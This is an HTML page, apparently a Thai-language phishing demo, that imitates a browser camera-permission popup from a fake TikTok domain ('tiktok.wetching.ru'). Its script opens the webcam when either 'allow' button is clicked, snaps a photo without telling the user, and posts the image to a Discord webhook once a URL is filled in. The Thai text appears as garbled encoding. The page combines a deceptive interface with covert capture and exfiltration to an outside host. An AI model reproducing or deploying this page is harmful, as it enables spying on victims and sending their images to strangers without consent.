<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <title>Artkungloveyouna</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      background: #000;
      color: #e5e7eb;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    /* ‡∏û‡∏∑‡πâ‡∏ô‡∏´‡∏•‡∏±‡∏á‡πÇ‡∏•‡πÇ‡∏Å‡πâ‡∏Å‡∏•‡∏≤‡∏á‡∏à‡∏≠ */
    .tiktok-bg {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      pointer-events: none;
      opacity: 0.25;
      font-size: 120px;
      font-weight: 700;
    }

    /* ‡∏Å‡∏•‡πà‡∏≠‡∏á‡∏õ‡πä‡∏≠‡∏õ‡∏≠‡∏±‡∏õ */
    .modal {
      position: relative;
      z-index: 10;
      width: 360px;
      background: #111827;
      border-radius: 12px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.8);
      padding: 18px 18px 20px;
    }

    .modal-header {
      font-size: 14px;
      margin-bottom: 8px;
      color: #e5e7eb;
      font-weight: 600;
    }

    .modal-sub {
      font-size: 13px;
      color: #9ca3af;
      margin-bottom: 16px;
    }

    .preview-box {
      background: #020617;
      border-radius: 10px;
      border: 1px solid #1f2937;
      padding: 8px;
      margin-bottom: 10px;
      height: 150px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }

    .preview-box video {
      max-width: 100%;
      max-height: 100%;
      border-radius: 8px;
      display: none;
    }

    .spinner {
      border: 3px solid #1f2937;
      border-top: 3px solid #38bdf8;
      border-radius: 50%;
      width: 32px;
      height: 32px;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .device-select {
      width: 100%;
      margin-bottom: 14px;
    }

    .device-select select {
      width: 100%;
      background: #020617;
      border-radius: 8px;
      border: 1px solid #1f2937;
      padding: 6px 10px;
      font-size: 13px;
      color: #e5e7eb;
      outline: none;
    }

    .btn {
      width: 100%;
      padding: 8px 10px;
      border-radius: 999px;
      border: none;
      cursor: pointer;
      font-size: 14px;
      margin-bottom: 8px;
      font-weight: 500;
      transition: background 0.15s, transform 0.05s, opacity 0.15s;
    }

    .btn:active {
      transform: translateY(1px);
    }

    .btn-primary {
      background: #0ea5e9;
      color: #0f172a;
    }

    .btn-secondary {
      background: #0369a1;
      color: #e5e7eb;
    }

    .btn-danger {
      background: #27272a;
      color: #f97373;
    }

    .btn:hover {
      opacity: 0.9;
    }

    .status {
      margin-top: 4px;
      font-size: 12px;
      color: #9ca3af;
      min-height: 18px;
    }

    .status.error {
      color: #f97373;
    }

    .bottom-note {
      position: absolute;
      bottom: 10px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 11px;
      color: #6b7280;
    }

    /* ‡∏£‡∏π‡∏õ‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ñ‡πà‡∏≤‡∏¢‡πÅ‡∏•‡πâ‡∏ß (optional) */
    .photo-preview {
      position: fixed;
      right: 16px;
      bottom: 16px;
      width: 120px;
      border-radius: 10px;
      border: 1px solid #1f2937;
      overflow: hidden;
      background: #020617;
      padding: 4px;
      font-size: 11px;
      color: #9ca3af;
    }

    .photo-preview img {
      width: 100%;
      border-radius: 6px;
      display: block;
      margin-bottom: 2px;
    }
  </style>
</head>
<body>
  <!-- ‡∏û‡∏∑‡πâ‡∏ô‡∏´‡∏•‡∏±‡∏á‡πÇ‡∏•‡πÇ‡∏Å‡πâ‡∏ï‡∏¥‡πä‡∏Å‡∏ï‡πá‡∏≠‡∏Å‡∏õ‡∏•‡∏≠‡∏° ‡πÜ -->
  <div class="tiktok-bg">
    <span>‚ô™</span>
  </div>

  <!-- ‡∏õ‡πä‡∏≠‡∏õ‡∏≠‡∏±‡∏õ‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡∏£‡∏π‡∏õ‡∏ó‡∏µ‡πà‡∏≠‡∏≤‡∏£‡πå‡∏ï‡∏™‡πà‡∏á -->
  <div class="modal">
    <div class="modal-header">
      tiktok.wetching.ru ‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏ó‡∏µ‡πà‡∏à‡∏∞
    </div>
    <div class="modal-sub">
      ‡πÉ‡∏ä‡πâ‡∏Å‡∏•‡πâ‡∏≠‡∏á‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏ß‡∏¥‡∏î‡∏µ‡πÇ‡∏≠‡∏™‡∏ï‡∏£‡∏µ‡∏° (2)
    </div>

    <div class="preview-box">
      <video id="video" playsinline autoplay></video>
      <div class="spinner" id="spinner"></div>
    </div>

    <div class="device-select">
      <select id="cameraSelect">
        <option>‡∏Å‡∏•‡πâ‡∏≠‡∏á‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô‡∏Ç‡∏≠‡∏á‡∏£‡∏∞‡∏ö‡∏ö</option>
      </select>
    </div>

    <button class="btn btn-primary" id="allowAlways">
      ‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡∏ï‡∏•‡∏≠‡∏î‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡πÄ‡∏ß‡πá‡∏ö‡πÑ‡∏ã‡∏ï‡πå
    </button>

    <button class="btn btn-secondary" id="allowOnce">
      ‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡πÅ‡∏Ñ‡πà‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ô‡∏µ‡πâ
    </button>

    <button class="btn btn-danger" id="denyBtn">
      ‡πÑ‡∏°‡πà‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï
    </button>

    <div class="status" id="statusText"></div>
  </div>

  <!-- ‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏£‡∏π‡∏õ‡∏ó‡∏µ‡πà‡∏ñ‡πà‡∏≤‡∏¢‡πÅ‡∏•‡πâ‡∏ß (‡πÑ‡∏ß‡πâ‡∏î‡∏π‡πÄ‡∏•‡πà‡∏ô) -->
  <div class="photo-preview">
    <div>‡∏†‡∏≤‡∏û‡∏•‡πà‡∏≤‡∏™‡∏∏‡∏î</div>
    <img id="photo" alt="preview">
  </div>

  <div class="bottom-note">
    Demo by Art ‚Äî ‡∏Å‡∏•‡πâ‡∏≠‡∏á‡∏à‡∏∞‡∏ñ‡∏≤‡∏°‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡∏à‡∏≤‡∏Å‡πÄ‡∏ö‡∏£‡∏≤‡∏ß‡πå‡πÄ‡∏ã‡∏≠‡∏£‡πå‡∏à‡∏£‡∏¥‡∏á
  </div>

  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    // üëâ ‡∏ñ‡πâ‡∏≤‡∏≠‡∏¢‡∏≤‡∏Å‡∏™‡πà‡∏á‡πÑ‡∏õ Discord ‡πÉ‡∏´‡πâ‡πÉ‡∏™‡πà Webhook URL ‡∏ï‡∏£‡∏á‡∏ô‡∏µ‡πâ
    const WEBHOOK_URL = ""; // ‡πÉ‡∏™‡πà URL ‡∏ñ‡πâ‡∏≤‡∏≠‡∏¢‡∏≤‡∏Å‡∏™‡πà‡∏á

    const video       = document.getElementById("video");
    const spinner     = document.getElementById("spinner");
    const canvas      = document.getElementById("canvas");
    const photo       = document.getElementById("photo");
    const statusText  = document.getElementById("statusText");
    const allowOnce   = document.getElementById("allowOnce");
    const allowAlways = document.getElementById("allowAlways");
    const denyBtn     = document.getElementById("denyBtn");

    let streamRef = null;

    async function openCameraAndCapture() {
      statusText.textContent = "‡∏Å‡∏≥‡∏•‡∏±‡∏á‡πÄ‡∏õ‡∏¥‡∏î‡∏Å‡∏•‡πâ‡∏≠‡∏á...";
      statusText.classList.remove("error");
      spinner.style.display = "block";
      video.style.display   = "none";

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        streamRef = stream;
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        spinner.style.display = "none";
        video.style.display   = "block";
        statusText.textContent = "‡∏Å‡∏≥‡∏•‡∏±‡∏á‡πÄ‡∏ï‡∏£‡∏µ‡∏¢‡∏°‡∏ñ‡πà‡∏≤‡∏¢‡∏£‡∏π‡∏õ...";

        // ‡∏£‡∏≠‡πÉ‡∏´‡πâ‡∏†‡∏≤‡∏û‡∏ô‡∏¥‡πà‡∏á‡∏ô‡∏¥‡∏î‡∏ô‡∏∂‡∏á
        await new Promise(r => setTimeout(r, 700));

        const w = video.videoWidth;
        const h = video.videoHeight;
        canvas.width = w;
        canvas.height = h;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, w, h);

        const dataURL = canvas.toDataURL("image/png");
        photo.src = dataURL;

        statusText.textContent = "‡∏ñ‡πà‡∏≤‡∏¢‡∏£‡∏π‡∏õ‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢‡πÅ‡∏•‡πâ‡∏ß ‚úÖ";

        // ‡∏ñ‡πâ‡∏≤‡∏≠‡∏¢‡∏≤‡∏Å‡∏™‡πà‡∏á‡πÑ‡∏õ Discord
        if (WEBHOOK_URL) {
          statusText.textContent = "‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏™‡πà‡∏á‡∏£‡∏π‡∏õ‡πÑ‡∏õ Discord...";
          const blob = await (await fetch(dataURL)).blob();
          const form = new FormData();
          form.append("file", blob, "capture-" + Date.now() + ".png");
          form.append("content", "üì∏ New capture from Art demo");

          const res = await fetch(WEBHOOK_URL, {
            method: "POST",
            body: form
          });

          if (res.ok) {
            statusText.textContent = "‡∏™‡πà‡∏á‡∏£‡∏π‡∏õ‡πÑ‡∏õ Discord ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à ‚úÖ";
          } else {
            statusText.textContent = "‡∏™‡πà‡∏á‡∏£‡∏π‡∏õ‡πÑ‡∏°‡πà‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à ‚ùå (" + res.status + ")";
            statusText.classList.add("error");
          }
        }

      } catch (err) {
        console.error(err);
        spinner.style.display = "none";
        statusText.textContent = "‡πÄ‡∏õ‡∏¥‡∏î‡∏Å‡∏•‡πâ‡∏≠‡∏á‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡∏´‡∏£‡∏∑‡∏≠‡∏ñ‡∏π‡∏Å‡∏õ‡∏è‡∏¥‡πÄ‡∏™‡∏ò ‚ùå";
        statusText.classList.add("error");
      } finally {
        if (streamRef) {
          streamRef.getTracks().forEach(t => t.stop());
          streamRef = null;
        }
      }
    }

    // ‡∏õ‡∏∏‡πà‡∏° ‚Äú‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‚Äù ‡∏ó‡∏±‡πâ‡∏á‡∏™‡∏≠‡∏á‡∏≠‡∏±‡∏ô‡πÉ‡∏´‡πâ‡∏ó‡∏≥‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡∏Å‡∏±‡∏ô‡πÑ‡∏õ‡∏Å‡πà‡∏≠‡∏ô
    allowOnce.addEventListener("click", () => {
      openCameraAndCapture();
    });

    allowAlways.addEventListener("click", () => {
      // ‡πÉ‡∏ô‡πÄ‡∏ß‡πá‡∏ö‡∏à‡∏£‡∏¥‡∏á‡∏≠‡∏≤‡∏à‡πÄ‡∏Å‡πá‡∏ö state ‡∏ß‡πà‡∏≤‡πÄ‡∏Ñ‡∏¢‡∏Å‡∏î always ‡πÅ‡∏•‡πâ‡∏ß
      openCameraAndCapture();
    });

    denyBtn.addEventListener("click", () => {
      statusText.textContent = "‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏õ‡∏è‡∏¥‡πÄ‡∏™‡∏ò‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏Å‡∏•‡πâ‡∏≠‡∏á ‚ùå";
      statusText.classList.add("error");
    });
  </script>
</body>
</html>
